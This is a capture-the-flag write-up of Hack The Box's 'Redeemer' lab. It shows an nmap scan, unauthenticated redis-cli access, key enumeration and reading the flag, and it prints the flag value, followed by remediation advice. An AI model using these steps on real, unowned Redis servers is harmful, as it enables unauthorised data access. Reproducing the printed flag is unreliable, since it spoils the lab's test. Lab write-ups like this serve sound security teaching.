# Redeemer

**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Linux · **Difficulty:** Tier 0

**Summary:** Redis on port 6379 had no authentication at all, so I could connect remotely, enumerate the keys and read the stored data.

## 1. Reconnaissance

- **Command:** `nmap -sV -p- 10.129.9.138 `
- **Open ports:**

| **Port** | **Service** | **Version**                 | **State** |
| -------- | ----------- | --------------------------- | --------- |
| 6379     | redis       | Redis key-value store 5.0.7 | Open      |

- **Key finding:** Redis is publicly exposed and needs no credentials, so anyone can connect and run admin commands.

## 2. Foothold

- **Vulnerability:** Redis unauthenticated access.

Steps:
1. Connect to the server: `redis-cli -h 10.129.9.138`
2. Get server and database info (db0 has 4 keys): `info`
3. List every key in the default database: `KEYS *`
4. Read the target key: `GET flag`

```
	10.129.9.138:6379> info
	\# Keyspace
	db0:keys=4,expires=0,avg_ttl=0
	10.129.9.138:6379> KEYS *
	\1) "numb"
	\2) "flag"
	\3) "temp"
	\4) "stor"
10.129.9.138:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.9.138:6379> 
```

## 3. Privilege Escalation

Not applicable: the data is readable directly from Redis.

- 🚩 **Flag:** `03e1d2b376c37ab3f5319922053953eb`

## 4. Conclusion

**Chain:** Redis exposed on 6379 → no authentication → all keys readable.

**Remediation:**
- **Authentication (`requirepass`):** set a strong password in `redis.conf` with `requirepass <password>`.
- **Network restriction (`bind`):** if Redis doesn't need outside access, set `bind 127.0.0.1` in `redis.conf` so it only listens locally.
- **Rename dangerous commands:** disable or rename critical commands (`CONFIG`, `FLUSHDB`, `FLUSHALL`) with `rename-command` in the config file.
